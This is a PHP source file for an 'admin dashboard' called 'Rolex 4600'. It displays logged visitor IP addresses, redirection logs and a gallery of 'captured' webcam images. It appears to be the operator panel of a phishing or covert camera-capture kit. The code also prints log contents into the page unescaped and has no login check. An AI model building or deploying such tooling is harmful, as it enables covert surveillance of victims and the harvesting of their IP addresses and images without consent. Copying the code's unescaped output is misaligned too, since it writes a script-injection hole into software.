/* dashboard.php - Web interface for viewing logged data */
<?php
$ip_log = file_exists("ip.txt") ? file_get_contents("ip.txt") : "No IP logs found.";
$redirect_log = file_exists("redirects.log") ? file_get_contents("redirects.log") : "No redirection logs found.";
$images = glob("cam_*.png");
?>
<!DOCTYPE html>
<html>
<head>
    <title>Rolex 4600 - Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 80%; margin: auto; }
        .logs, .images { margin-top: 20px; }
        img { width: 200px; margin: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Rolex 4600 - Admin Dashboard</h1>
        <h2>IP Logs</h2>
        <pre><?php echo $ip_log; ?></pre>
        <h2>Redirection Logs</h2>
        <pre><?php echo $redirect_log; ?></pre>
        <h2>Captured Images</h2>
        <div class="images">
            <?php foreach ($images as $img) {
                echo "<img src='$img' alt='Captured Image'>";
            } ?>
        </div>
    </div>
</body>
</html>
